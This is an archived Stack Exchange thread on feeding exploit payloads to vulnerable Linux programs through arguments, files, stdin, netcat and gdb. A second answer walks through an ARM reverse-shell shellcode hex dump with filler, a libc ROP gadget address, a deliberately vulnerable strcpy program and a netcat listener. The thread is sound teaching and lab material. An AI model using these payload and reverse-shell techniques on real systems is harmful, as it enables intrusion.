{
    "title": "Managing inputs for payload injection?",
    "link": "https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I am looking for a complete list of the ways to inject a payload in a vulnerable program in a Unix (Linux) context depending on the inputs opened by the program.</p>\n<p>I know that there are several tricks and tips but an exhaustive list would definitely help here.</p>\n</div>",
    "votes": "20",
    "answers": 2,
    "views": "38k",
    "tags": [
        "linux",
        "exploit",
        "binary"
    ],
    "user": "perror",
    "time": "Nov 14, 2016 at 16:13",
    "comments": [],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>Injecting payload and hexadecimal addresses through program inputs depends on the type of input you get. Here is a list of all the possible inputs and the way to do it with both a pure shell environment and from within <code>gdb</code>.</p>\n<h1>Getting inputs from <code>char *argv[]</code></h1>\n<p>In this case, the arguments are read from the initial command line, so the most convenient thing is:</p>\n<pre><code>$&gt; ./program $(echo -ne \"\\xef\\xbe\\xad\\xde\")\n</code></pre>\n<p>In <code>gdb</code>, you need to pass the arguments through the <code>run</code> command line like this:</p>\n<pre><code>(gdb) run $(echo -ne \"\\xef\\xbe\\xad\\xde\")\n</code></pre>\n<h1>Getting inputs from a file</h1>\n<p>Here, you have no other choice but write in the file and then feed your program with this file like this:</p>\n<pre><code>$&gt; ./program ./myfile.txt\n</code></pre>\n<p>And, within <code>gdb</code>, it should look like this:</p>\n<pre><code>(gdb) run myfile.txt\n</code></pre>\n<p>Then, outside of <code>gdb</code> you can rewrite the content of the file and run your program again and again in <code>gdb</code>.</p>\n<h1>Getting inputs from <code>stdin</code></h1>\n<p>Getting the input through <code>stdin</code> can be achieve through a wide variety of functions such as <code>fgets()</code>, <code>scanf()</code>, <code>getline()</code>, <code>read()</code> and others. It raises a few problems because the program stop while executing and wait to be fed with characters. And, you would prefer to just have one feed at the beginning to try your stuff and see the result. Let see how to deal with this input.</p>\n<p>In case you have to deal with several inputs (eg login, password, ...), you need to use separators between the inputs. Usually the separator between each input is just a newline character (<code>\\n</code> or <code>\\r</code> depending on the system you are in).</p>\n<p>Now, you have two ways of doing to feed the <code>stdin</code>. Either you go through a file, like this:</p>\n<pre><code>$&gt; cat ./mycommands.txt | ./program\n</code></pre>\n<p>The <code>stdin</code> requires to run the command either through a file like this:</p>\n<pre><code>(gdb) run &lt; ./mycommands.txt\n</code></pre>\n<p>And do as said in the previous case.</p>\n<p>The other option is to pipe the output of a command to the <code>stdin</code> of the program like this:</p>\n<pre><code>$&gt; echo -ne \"\\xef\\xbe\\xad\\xde\" | ./program\n</code></pre>\n<p>In <code>gdb</code> you can use the <code>bash</code> <a href=\"https://www.gnu.org/software/bash/manual/bashref.html#Process-Substitution\" rel=\"noreferrer\">process substitution</a> <code>&lt;(cmd)</code> trick:</p>\n<pre><code>(gdb) run &lt; &lt;(echo -ne \"\\xef\\xbe\\xad\\xde\")\n</code></pre>\n<p>This way is much quicker than effectively creating a named pipe and branch your program on it as recommended on several websites. Creating the named pipe outside of <code>gdb</code> requires a lot of unnecessary steps where you have it instantly with the previous technique.</p>\n<p>Note also that, some people are using <code>&lt;&lt;$(cmd)</code> like this:</p>\n<pre><code>(gdb) run &lt;&lt;&lt; $(echo -ne \"\\xef\\xbe\\xad\\xde\")\n</code></pre>\n<p>But, this last technique seems to filter out all NULL bytes (for whatever reason), so you should prefer the first one (especially if you want to pass NULL bytes).</p>\n<h1>Getting inputs from network</h1>\n<p>Here, you need to use another tool called <code>netcat</code> (the Swiss army knife of networking), often shortened into <code>nc</code>. Basically, if your vulnerable program is listening on <code>localhost:666</code> then the command line would be:</p>\n<pre><code>$&gt; echo -ne \"\\xef\\xbe\\xad\\xde\" | nc -vv localhost 666\n</code></pre>\n<p>Within <code>gdb</code>, the point will be to run (<code>r</code>) the program and to connect to it from another terminal.</p>\n<h1>Keep the <code>stdin</code> open after injection</h1>\n<p>Most of the techniques for <code>stdin</code> will send the exploit string to the program which will end shortly after the termination of the input. The best way to keep it open afterward and get an active shell is to add a <code>cat</code> waiting for input on its <code>stdin</code>. It should look like this if you go though a file:</p>\n<pre><code>$&gt; (cat ./mycommands.txt; cat) | ./program\n</code></pre>\n<p>Or, like this if you want a shell command:</p>\n<pre><code>$&gt; (echo -ne \"\\xef\\xbe\\xad\\xde\"; cat) | ./program\n</code></pre>\n<p>Or, finally, if you are going through the network:</p>\n<pre><code>$&gt; (echo -ne \"\\xef\\xbe\\xad\\xde\"; cat) | nc -vv localhost 666\n</code></pre>\n<p>Note that I did not find how to do with <code>gdb</code> to keep the input open once the payload has been delivered.</p>\n<hr/>\n<h1>Update about Python3</h1>\n<p>You may have noticed that Python changed its way of handling raw bytes when going through the function <code>print()</code>. As an example you can have this kind of behavior (here is a comparison of the Python2 and Python3 behavior):</p>\n<pre><code>#&gt; python2.7 -c 'print(\"\\xde\\xad\\xbe\\xef\")' | xxd\n00000000: dead beef 0a                                ....\n#&gt; python3.9 -c 'print(\"\\xde\\xad\\xbe\\xef\")' | xxd\n00000000: c39e c2ad c2be c3af 0a                   .........\n</code></pre>\n<p>As you noticed, in Python3, the output of <code>print()</code> is expressed in UTF-8 characters which change a lot the result of the command. This is not really convenient when you try to send a sequence of selected bytes to the program you attack.</p>\n<p>So, if you are stuck with a system that offers nothing but a Python3 interpreter here is the command line to use:</p>\n<pre><code>python3.9 -c 'import sys; sys.stdout.buffer.write(b\"\\xde\\xad\\xbe\\xef\")' | xxd\n00000000: dead beef                                ....\n</code></pre>\n<p>You may notice that the command in Python3 is quite more complex than the one in Python2 which somehow ruin a bit the simplicity of the original command. If someone has a shorter and simpler way to achieve this, please drop a comment to this article, I am really looking forward it!</p>\n<p>An alternate way of doing it can use the <code>echo</code> command like that:</p>\n<pre><code>#&gt; echo -ne \"\\xde\\xad\\xbe\\xef\" | xxd\n00000000: dead beef                                ....\n</code></pre>\n<p>But, you cannot use the usual Python syntax such as <code>\"\\x90\" * 12 + \"\\xde\\xad\\xbe\\xef\"</code> which can be annoying if you want to look for the proper padding.</p>\n</div>",
            "votes": "31",
            "user": "perror",
            "time": "Sep 24, 2021 at 13:53",
            "is_accepted": true,
            "comments": [
                {
                    "user": "TruckerCat",
                    "text": "<span class=\"comment-copy\">Thank you, this was really helpful for me. I looked for a way to pass shell code to a function like fgetc.  First I got  <code>/bin/bash: warning: here-document at line 0 delimited by end-of-file (wanted python)</code>, when using <code>(gdb) r &lt; &lt;(python exploit.py)</code>. To resolve this I removed spaces from the end of my python script, as suggested in this answer  <a href=\"https://stackoverflow.com/questions/18660798/here-document-gives-unexpected-end-of-file-error\" title=\"here document gives unexpected end of file error\">stackoverflow.com/questions/18660798/…</a>. Now it works  :-)</span>",
                    "time": null
                },
                {
                    "user": "iMil",
                    "text": "<span class=\"comment-copy\"><i>[...]this last technique seems to filter out all NULL bytes (for whatever reason)[...]</i>: using <code>/bin/echo</code> works in both cases, meaning it's built-in's <code>gdb</code> who's messing with <code>\\x0</code>'s.</span>",
                    "time": null
                },
                {
                    "user": "perror",
                    "text": "<span class=\"comment-copy\">@iMil Indeed, I am using <code>echo -ne</code> by now... I should (and I will) update the article to refer about this. Thanks for mentioning it !</span>",
                    "time": null
                },
                {
                    "user": "perror",
                    "text": "<span class=\"comment-copy\">@iMil I finally took the time to change the article to <code>echo</code> only... Sorry for the long delay.</span>",
                    "time": null
                }
            ]
        },
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>Maybe my investigation will be helpful for somebody.</p>\n<p><strong>Brief:</strong></p>\n<p>I've prepare the reverse shellcode in assembler for ARM architecture (Raspberry Pi 1 B emulated in Qemu). When I start to test it I encounter few strange behaviours, which I would like to share.</p>\n<p><strong>Preparation:</strong></p>\n<ol>\n<li><p>file:</p>\n<p><code>reverseShell.s</code></p>\n</li>\n</ol>\n<hr/>\n<ol start=\"2\">\n<li><p>language:</p>\n<p>assembler for ARM architecture (Raspberry Pi 1 B)</p>\n</li>\n</ol>\n<hr/>\n<ol start=\"3\">\n<li><p>compilation:</p>\n<p><code>as reverseShell.s -o reverseShell.o &amp;&amp; ld -N reverseShell.o -o reverseShell</code></p>\n</li>\n</ol>\n<hr/>\n<ol start=\"4\">\n<li><p>execution:</p>\n<p>4.1. host system:</p>\n<pre><code>   nc -lvvp 4444\n   Listening on [0.0.0.0] (family 0, port 4444)\n</code></pre>\n<p>4.2. target: (Raspberry Pi 1 B):</p>\n<pre><code>  `./ReverseShell`\n</code></pre>\n<p>4.3. host system:</p>\n<pre><code>   Connection from arm 60036 received!\n   pwd\n   /home/user/ARM/03_Security\n</code></pre>\n</li>\n</ol>\n<hr/>\n<p>OK, looks good for now</p>\n<p><strong>Generating the payload (hex dump):</strong></p>\n<ol>\n<li>translate the execution to binary</li>\n</ol>\n<pre><code>   objcopy -O binary ReverseShell ReverseShell.bin\n</code></pre>\n<ol start=\"3\">\n<li>dump to hexadecimal format (convert to payload)</li>\n</ol>\n<pre><code>   hexdump -v -e '\"\\\\\"\"x\" 1/1 \"%02x\" \"\"' ReverseShell.bin\n   \\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\x20\\x01\\x21\\x92\\x1a.....\n</code></pre>\n<ol start=\"4\">\n<li><p>In this step, the appropriate number of filler was added at the beginning of the payload - like almost everybody - I used character 'A' which is 41hex. The number of the character depends on the buffer which will be overwritten - in my case it was 12 characters.</p>\n</li>\n<li><p>Next step was to find the base address of the libc-2.27.so in the virtual memory map and the address of the useful gadget in the libc-2.27.so. For me the best tool for searching the gadgets is ropper. The start address (base) of the libc-2.27 (maybe in your case it will be different library version and different address) in my case was: <code>0xb6ede000</code>. The gadget address was: <code>0x00003db9</code>. After gluing: <code>0xb6ee1db9</code>. This hexadecimal adres form must be paste after the filler and before the payload. So now, the beginning of the payload (together with filler and gadget address) was:</p>\n</li>\n</ol>\n<pre><code>\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\xb9\\x1d\\xee\\xb6\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\x20\\x01\\x21\\x92\\x1a\\xc8\\x27\\x51\\x37\\x01\\xdf\\x04\\x1c\\x0a\\xa1\\x4a\\x70\\x10\\x22\\x02\\x37\\x01\\xdf\\x3f\\x27\\x20\\x1c\\x49\\x1a\\x01\\xdf\\x20\\x1c\\x01\\......\n</code></pre>\n<p><strong>Passing the payload to the vulnerable program:</strong></p>\n<ol>\n<li>The vulnerable program:</li>\n</ol>\n<pre><code>    #include &lt;stdio.h&gt;\n    #include &lt;string.h&gt;\n    \n    void func1(char *s)\n    {\n      char buffer[8];\n      strcpy(buffer, s);\n    }\n    \n    int main(int argc, char *argv[])\n    {\n      func1(argv[1]);\n      printf(\"Everything is fine.\\n\");\n    }\n</code></pre>\n<ol start=\"2\">\n<li>gdb (gef) session</li>\n</ol>\n<p>I run the gdb with argument as a payload like below:</p>\n<pre><code>gdb --args ./program $(python2.7 -c- 'print(\"\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\xb9\\x1d\\xee\\xb6\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\x20\\x01\\x21\\x92\\x1a\\xc8\\x27\\x51\\x37\\x01\\xdf\\x04\\x1c\\x0a\\xa1\\x4a\\x70\\x10\\x22\\x02\\x37\\x01\\xdf\\x3f\\x27\\x20\\x1c\\x49\\x1a\\x01\\xdf\\x20\\x1c\\...\")')\n</code></pre>\n<p>Put the breakpoint on the main and run. Still looks OK. I can put the breakpoint in the func1, just before returning from them:</p>\n<p><a href=\"https://i.sstatic.net/s51tr.jpg\" rel=\"nofollow noreferrer\"><img alt=\"enter image description here\" src=\"https://i.sstatic.net/s51tr.jpg\"/></a></p>\n<p>In this point, the stack should already be overwritten and after  `pop', the program should branch to previously glued gadget address and start to execute the program from the previously \"prepared\" stack. Sooo let's have a look on the content of the stack:\n<a href=\"https://i.sstatic.net/70ueE.jpg\" rel=\"nofollow noreferrer\"><img alt=\"enter image description here\" src=\"https://i.sstatic.net/70ueE.jpg\"/></a></p>\n<p>red digits:</p>\n<p>1 - ok, this is the filler 12 times 'A' character</p>\n<p>2 - the gadget address - still ok</p>\n<p>3 - the beginning of the payload</p>\n<p>4 - Ops, something went wrong, this part of payload should be:</p>\n<p>x13\\xff\\x2f\\xe1\\x02\\x20\\x01\\x21</p>\n<p>but corresponding part of the memory is:</p>\n<p>0xe12fff13   0x21010002</p>\n<p>Why in second word instead of 0x20 I have 0x00 ?</p>\n<p>Ok, I've try to do this with python 3, but NULL will be there even with Python3.\nThis is only the one question. Did you encounter similar situation. What even more interesting, when I change the strcpy() to memcpy() in the func1(), and copy whole payload - 96 bytes, I have still 0 in this place. Am I lost something? I have no NULL's on the payload. Of course the session will crashed with segmentation fault, but I don't expect nothing different. As you can see, the number of NULL's is bigger, further in the memory dump, but no idea why.</p>\n</div>",
            "votes": "1",
            "user": "robi251",
            "time": "Oct 25, 2022 at 10:32",
            "is_accepted": false,
            "comments": [
                {
                    "user": "perror",
                    "text": "<span class=\"comment-copy\">Python3 prints only UTF-8 outputs, so if it encounters some <code>\\x20</code>, it won't print the byte but the string <code>\"\\x20\"</code>. Which is really irritating because python2 was working properly.</span>",
                    "time": null
                },
                {
                    "user": "robi251",
                    "text": "<span class=\"comment-copy\">Yes, you are right in case, when we are using Python3, but in abow example I'm using Python 2</span>",
                    "time": null
                }
            ]
        }
    ]
}